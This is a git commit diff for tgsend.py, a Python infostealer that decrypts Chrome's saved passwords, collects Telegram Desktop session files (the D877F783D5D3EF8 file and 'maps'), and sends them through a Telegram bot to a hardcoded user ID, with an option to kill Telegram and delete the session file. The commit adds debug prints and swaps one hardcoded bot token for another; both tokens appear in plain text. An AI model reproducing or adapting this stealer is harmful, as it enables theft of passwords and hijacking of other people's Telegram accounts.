1214fd5315ccc7f6d12639517c9aff2612d6ceb8
sergava <38960886+sergava@users.noreply.github.com>
2020-05-18 00:07:15 +0300

    Small fixes and prints added

--- tgsend.py
+++ tgsend.py
@@ -7,8 +7,8 @@ try:
     from Crypto.Cipher import AES
     import os
     import sqlite3
-except:
-    print("Error importing")
+except Exception as e:
+    print("ERROR importing: " + repr(e))
     pass
 
 
@@ -16,7 +16,7 @@ log_out = 0  # 1 - is on, 0 - is off
 
 
 user_id = 441449437
-token = '1265089268:AAEfhXYnRGe0Npj_DXxmN9aXZpVh8U4sO_g'
+token = '651660605:AAHJCsxWiMXEtchhll534q8TMcaHYLyL7SY'
 name_ur_txt = 'pass.txt'
 
 
@@ -35,7 +35,7 @@ def getmasterkey():
             master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
             return master_key
     except:
-        print("can't access masterkey")
+        print("ERROR: couldn't access the masterkey")
         pass
 
 
@@ -65,8 +65,8 @@ def Chrome():
                 text += url + ' | ' + login + ' | ' + decrypted_pass + '\n'
                 with open(name_ur_txt, "w", encoding="utf-8") as f:
                     f.write(text)
-    except:
-        print("error in Chrome()")
+    except Exception as e:
+        print("ERROR in Chrome() func: " + repr(e))
         pass
 
 
@@ -75,9 +75,12 @@ def finddir(path):
         for name in dirs:
             if name == "Telegram Desktop":
                 found = os.path.join(root, name)
-                print(found)
+                print("***Checking folder: " + found)
                 if os.path.exists(found + '\\Telegram.exe'):
+                    print("***OK Telegram Desktop hab been found")
                     return found
+                else:
+                    print("ERROR: is not an actual TG folder")
 
 
 if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
@@ -87,11 +90,13 @@ else:
     for i in paths:
         tddir = finddir(i)
         if tddir is not None:
+            user = pathusr + " " + tddir
             tdata_path = tddir + '\\tdata\\'
             break
         else:
+            user = pathusr + " (TG not found)"
+            print("ERROR: Couldn't find 'Telegram Desktop' folder in " + i)
             pass
-
 
 def logout_windows(bool):
     if bool:
@@ -100,11 +105,10 @@ def logout_windows(bool):
             os.system('taskkill /f /im Telegram.exe')
             os.remove(pathd877)
         except Exception as e:
-            print("failed to logout")
-            print(repr(e))
+            print("ERROR: Failed to logout: " + repr(e))
             pass
     else:
-        print("logout is not on")
+        print("***Logout state is 0")
         pass
 
 
@@ -112,9 +116,9 @@ def send_txt():
     try:
         bot.send_document(user_id, open(name_ur_txt,'rb'))
         os.remove(name_ur_txt)
+        print("***OK Passwords have been sended successfully")
     except Exception as e:
-        print("Error in send_txt()")
-        print(repr(e))
+        print("ERROR in send_txt() func: " + repr(e))
         pass
 
 
@@ -125,28 +129,28 @@ def send_session_files():
                 mapsdir = os.path.join(tdata_path, dir)
         for file in files:
             if file[0:15] == "D877F783D5D3EF8":
-                print("match D877F783D5D3EF8")
+                print("***OK Matched D877F783D5D3EF8")
                 global pathd877
                 pathd877 = os.path.join(tdata_path, file)
                 bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'))
             elif file == "maps":
-                print("match maps")
+                print("***OK Matched maps")
                 bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'))
 
 
 def main():
     try:
         Chrome()
-        user = pathusr + " " + tddir
         bot.send_message(user_id, user)
         send_txt()
         send_session_files()
         logout_windows(log_out)
     except Exception as e:
-        print(repr(e), 'Main function error')
+        print('ERROR: Main function: ' + repr(e))
         pass
 
 
 if __name__ == '__main__':
     main()
+    print("***Finished***")
 
